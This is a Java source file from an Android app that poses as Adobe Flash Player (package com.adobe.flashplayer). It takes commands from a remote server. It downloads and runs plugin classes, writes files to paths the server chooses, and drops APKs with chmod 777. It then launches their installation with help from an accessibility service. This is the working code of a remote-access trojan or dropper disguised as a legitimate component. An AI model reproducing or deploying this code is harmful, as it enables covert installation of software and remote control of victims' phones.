package com.adobe.flashplayer.network;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import androidx.core.content.FileProvider;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.core.AccessibilitySrv;
import com.adobe.flashplayer.plugin.Update;


public class FileDownloader {

    private static String TAG = "[ljg]FileDownloader ";

    public static void pluginDownloader(byte [] recvbuf,int recvlen,int recvpacklen,Context context,InputStream ins){
        try {
            int nextrecvlen = 0;
            nextrecvlen += recvlen;

            byte[] bytefilenamelen = new byte[4];
            System.arraycopy(recvbuf, 24, bytefilenamelen, 0, 4);
            int filenamelen = Utils.bytesToInt(bytefilenamelen);
            byte[] downloadfilename = new byte[filenamelen];
            System.arraycopy(recvbuf, 28, downloadfilename, 0, filenamelen);

            String downloadpath = context.getFilesDir() + "/update_plugin/" ;
            File updatedirfile = new File(downloadpath);
            if (updatedirfile.exists() == false) {
                updatedirfile.mkdir();
            }

            String downloadfn = downloadpath + new String(downloadfilename);
            File downloadfile = new File(downloadfn);
            if (downloadfile.exists() == true) {
                downloadfile.delete();
            }
            downloadfile.createNewFile();

            byte[] bytefuncnlen = new byte[4];
            System.arraycopy(recvbuf, 24 + 4 +filenamelen, bytefuncnlen, 0, 4);
            int classnamelen = Utils.bytesToInt(bytefuncnlen);
            byte[] clsname = new byte[classnamelen];
            System.arraycopy(recvbuf, 24 + 4 +filenamelen +4, clsname, 0, classnamelen);
            String updateclsname = new String(clsname);
            MyLog.writeLogFile("update filename:" + downloadfn + " update func name:" + updateclsname + "\r\n");

            byte[] bytedownloadfilesize = new byte[4];
            System.arraycopy(recvbuf, 24 + 4 + filenamelen + 4 + classnamelen, bytedownloadfilesize, 0, 4);
            int downloadfilesize = Utils.bytesToInt(bytedownloadfilesize);

            int firstblocksize = nextrecvlen - (24 + 4 + filenamelen + 4 + classnamelen + 4);
            if (firstblocksize < 0) {

                MyLog.writeLogFile("update first block size error:" + firstblocksize + "\r\n");
                return;
            }
            FileOutputStream fos = new FileOutputStream(downloadfile,true);
            fos.write(recvbuf,24 + 4 + filenamelen + 4 + classnamelen + 4,firstblocksize);

            int totalrecv = nextrecvlen;
            int totalfs = firstblocksize;

            if (recvpacklen > nextrecvlen) {
                while((nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE)) > 0){
                    fos.write(recvbuf,0,nextrecvlen);
                    totalrecv += nextrecvlen;
                    totalfs += nextrecvlen;
                    if (totalfs >= downloadfilesize) {
                        break;
                    }
                }
            }

            fos.flush();
            fos.close();

            int totallen = recvpacklen;

            if (totalrecv != totallen || totalfs != downloadfilesize) {
                return;
            }else{
                Log.e(TAG,"update file ok");
            }

            Update update = new Update(context,downloadfn, updateclsname);
            Thread thread = new Thread(update);
            thread.start();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (recvpacklen < recvlen) {
            MyLog.writeLogFile("update total size:" + recvpacklen + ",first recv size:" + recvlen + "\r\n");
            return;
        }
    }




    public static void apkDownloader(byte [] recvbuf,int recvlen,int recvpacklen,Context context,InputStream ins){
        try {
            if (recvpacklen < recvlen) {
                MyLog.writeLogFile("installapk total size:" + recvpacklen + " first recv size:" + recvlen + "\r\n");
                return;
            }

            int nextrecvlen = recvlen;

            String tmpfn = Public.SDCARD_PATH_NAME;

            byte[] bytedlfnlen = new byte[4];
            System.arraycopy(recvbuf, 24, bytedlfnlen, 0, 4);
            int downloadfilenamelen = Utils.bytesToInt(bytedlfnlen);
            byte[] downloadfilename = new byte[downloadfilenamelen];
            System.arraycopy(recvbuf, 28, downloadfilename, 0, downloadfilenamelen);

            String apkfilepath = tmpfn + new String(downloadfilename);
            MyLog.writeLogFile("installapk filename:" + apkfilepath + "\r\n");
            File apkfile = new File(apkfilepath);
            if (apkfile.exists() == true) {
                apkfile.delete();
            }
            apkfile.createNewFile();

            byte[] bytedownloadfilesize = new byte[4];
            System.arraycopy(recvbuf, 24 + 4 + downloadfilenamelen, bytedownloadfilesize, 0, 4);
            int downloadfilesize = Utils.bytesToInt(bytedownloadfilesize);

            int firstblocksize = nextrecvlen - (24 + 4 + downloadfilenamelen + 4);
            if (firstblocksize < 0) {
                MyLog.writeLogFile("installapk first block size error:" + firstblocksize + "\r\n");
                return;
            }
            FileOutputStream fos = new FileOutputStream(apkfile,true);
            fos.write(recvbuf,24 + 4 + downloadfilenamelen + 4,firstblocksize);

            int totalrecv = nextrecvlen;
            int totalfs = firstblocksize;

            if (recvpacklen > nextrecvlen) {
                while( (nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE))>0 ){

                    fos.write(recvbuf,0,nextrecvlen);
                    totalrecv += nextrecvlen;
                    totalfs += nextrecvlen;
                    if (totalfs >= downloadfilesize) {
                        break;
                    }
                }
            }
            fos.flush();
            fos.close();

            int totallen = recvpacklen;
            MyLog.writeLogFile("CMD_AUTOINSTALL total:" + totallen + ",recved:" +totalrecv +
                    ",data recved:" + totalfs + ",file size:" + downloadfilesize +"\r\n");

            if (totalrecv != totallen || totalfs != downloadfilesize) {
                Log.e(TAG,"down load apk error");
            }else{
                Log.e(TAG,"down load apk ok");
            }



            Process p = Runtime.getRuntime().exec("chmod 777 " + apkfilepath);
            int status = p.waitFor();
            if (status == 0) {
                //chmod succeed
                MyLog.writeLogFile("chmod autoinstallapk ok\r\n");
            } else {
                //chmod failed
                MyLog.writeLogFile("chmod autoinstallapk error\r\n");
                //return;
            }

            PackageManager pm = context.getPackageManager();
            String installpackagename = "";
            PackageInfo info = pm.getPackageArchiveInfo(apkfilepath, PackageManager.GET_ACTIVITIES);
            if(info != null){
                ApplicationInfo appInfo = info.applicationInfo;
                AccessibilitySrv.installAPkName = pm.getApplicationLabel(appInfo).toString();
                AccessibilitySrv.installAPkFileName = appInfo.packageName;
                //accessibilityService.installVersion=info.versionName;
                installpackagename = info.packageName;
                Log.e(TAG,"install package name:" + installpackagename);
            }

            AccessibilitySrv.installAPkFileName = apkfilepath;
            AccessibilitySrv.openOrOverAfterInstall = false;

            String packname = context.getPackageName();
            Intent localIntent = new Intent(Intent.ACTION_VIEW);
            localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            Uri uri = null;

            if (Build.VERSION.SDK_INT >= 24) {
                uri = FileProvider.getUriForFile(context,packname+".FileProvider",new File(apkfilepath));

                localIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            }
            else {
                uri = Uri.fromFile(new File(apkfilepath));
            }
            localIntent.setDataAndType(uri, "application/vnd.android.package-archive");
            context.startActivity(localIntent);

            Log.e(TAG,"auto install apk filename:" + apkfilepath);
            MyLog.writeLogFile("ServerCommand auto install apk filename:" + apkfilepath  + "\r\n");

            apkfile.delete();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }






    public static void fileDownloader(byte [] recvbuf,int recvlen,int recvpacklen,Context context,InputStream ins){
        try {
            if (recvpacklen < recvlen) {
                MyLog.writeLogFile("download total size:" + recvpacklen + " first recv size:" + recvlen + "\r\n");
                return;
            }

            int nextrecvlen = recvlen;

            byte[] bytedownloadfnlen = new byte[4];
            System.arraycopy(recvbuf, 24, bytedownloadfnlen, 0, 4);
            int downloadfnlen = Utils.bytesToInt(bytedownloadfnlen);
            byte[] downloadfilename = new byte[downloadfnlen];
            System.arraycopy(recvbuf, 28, downloadfilename, 0, downloadfnlen);

            String downloadfn = new String(downloadfilename);
            MyLog.writeLogFile("download filename:" + downloadfn + "\r\n");
            File downloadfile = new File(downloadfn);

            if (downloadfile.exists() == true) {
                downloadfile.delete();
            }
            downloadfile.createNewFile();

            byte[] bytedownloadfz = new byte[4];
            System.arraycopy(recvbuf, 24 + 4 + downloadfnlen, bytedownloadfz, 0, 4);
            int downloadfilesize = Utils.bytesToInt(bytedownloadfz);

            int firstblocksize = nextrecvlen - (24 + 4 + downloadfnlen + 4);
            if (firstblocksize < 0) {
                MyLog.writeLogFile("download first block size error:" + firstblocksize + "\r\n");
                return;
            }
            FileOutputStream fos = new FileOutputStream(downloadfile,true);
            fos.write(recvbuf,24 + 4 + downloadfnlen + 4,firstblocksize);

            int totalrecv = nextrecvlen;
            int totalfs = firstblocksize;

            if (recvpacklen > nextrecvlen) {
                while((nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE)) > 0){
                    fos.write(recvbuf,0,nextrecvlen);
                    totalrecv += nextrecvlen;
                    totalfs += nextrecvlen;
                    if (totalfs >= downloadfilesize) {
                        break;
                    }
                }
            }

            fos.flush();
            fos.close();

            int totallen = recvpacklen;

            MyLog.writeLogFile("CMD_DOWNLOADFILE total:" + totallen + ",recved:" +totalrecv + ",data recved:" + totalfs + ",file size:" + downloadfilesize +"\r\n");
            if (totalrecv != totallen || totalfs != downloadfilesize) {
                return;
            }else{
                Log.e(TAG,"down load file ok");
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
